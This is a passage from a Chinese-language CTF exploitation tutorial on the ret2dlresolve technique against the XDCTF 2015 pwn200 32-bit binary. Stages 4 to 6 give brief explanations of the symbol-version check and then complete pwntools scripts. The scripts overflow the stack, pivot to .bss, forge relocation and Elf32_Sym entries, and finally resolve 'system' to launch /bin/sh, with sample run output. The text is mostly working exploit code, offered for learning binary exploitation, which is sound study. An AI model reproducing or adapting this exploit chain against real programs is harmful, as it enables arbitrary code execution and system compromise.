</code></pre></div> <p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p> <p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。</p> <p>那自然的，我们就可以调用目标函数。</p> <p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p> <ul> <li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。</li> <li>那么，这也就说明原先的符号表偏移少了对应的个数。</li> <li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span>
                <span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mh>0x4c</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=n>gnu_version_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.gnu.version&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=nb>print</span><span class=p>(</span><span class=s2>&quot;ndx_addr: </span><span class=si>%s</span><span class=s2>&quot;</span> <span class=o>%</span> <span class=nb>hex</span><span class=p>(</span><span class=n>gnu_version_addr</span><span class=o>+</span><span class=n>index_dynsym</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最终如下</p> <div class=highlight><pre><span></span><code>❯ python stage4.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>27967</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr: 0x80487c2
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <h5 id=stage-5>stage 5<a class=headerlink href=#stage-5 title="Permanent link">&para;</a></h5> <p>这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>st_name</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=n>dynstr</span>         <span class=c1># plus 10 since the size of Elf32_Sym is 16.</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>st_name</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;write</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># there must be a \x00 to mark the end of string</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯ python stage5.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>27994</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <p>事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。</p> <h5 id=stage-6>stage 6<a class=headerlink href=#stage-6 title="Permanent link">&para;</a></h5> <p>这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 <code>_dl_runtime_resolve</code> 函数最终是依赖函数名来解析目标地址的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>st_name</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=n>dynstr</span>         <span class=c1># plus 10 since the size of Elf32_Sym is 16.</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>st_name</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=n>gnu_version_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.gnu.version&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=nb>print</span><span class=p>(</span><span class=s2>&quot;ndx_addr: </span><span class=si>%s</span><span class=s2>&quot;</span> <span class=o>%</span> <span class=nb>hex</span><span class=p>(</span><span class=n>gnu_version_addr</span><span class=o>+</span><span class=n>index_dynsym</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span>

<span class=c1># construct ropchain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>82</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;system</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># there must be a \x00 to mark the end of string</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span> <span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>()</span>
<span class=nb>print</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
